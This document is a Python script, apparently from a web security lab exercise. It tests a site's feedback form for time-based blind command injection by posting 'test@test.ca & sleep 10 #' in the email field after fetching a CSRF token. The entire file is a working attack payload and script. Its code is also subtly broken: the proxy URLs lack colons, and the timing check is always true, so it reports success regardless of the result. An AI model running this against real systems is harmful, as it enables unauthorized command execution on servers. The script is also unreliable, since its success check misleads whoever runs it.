import sys
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http//127.0.0.1:8080', 'https':'https//127.0.0.1:8080'}

def get_csrf_token(s, url):
    r= s.get(url+'/feedback', verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text,  'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def check_cammand_injection(url, s):
    feedback_path_url = url + '/feedback/submit'
    command_injection = 'test@test.ca & sleep 10 #'
    csrf_token= get_csrf_token(s, url)
    data = {'csrf': csrf_token, 'name': 'test', 'email':command_injection, 'subject': 'Test', 'message': 'Test'}
    r = s.post(feedback_path_url, data=data , verify=False, proxies= proxies)
    if {r.elapsed.total_seconds()>=10}:
        print("(+)Email field is vulnerable to time delay")
        print("(+) Command Injection is successful...")
    else:
        print("(+) Command Injection is unsuccessful or Email Field is not vulnerable to time delay")

def main():
    if len(sys.argv) != 2:
        print(" (+) Usage: %s <url>" % sys.argv [0])
        print(" (+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)     
    url = sys.argv[1]
    print("(+) Checking if email parameter is vulnerable to time based command injection")
    s = requests.Session()
    check_cammand_injection(url,s) 

if __name__ == '__main__':
    main()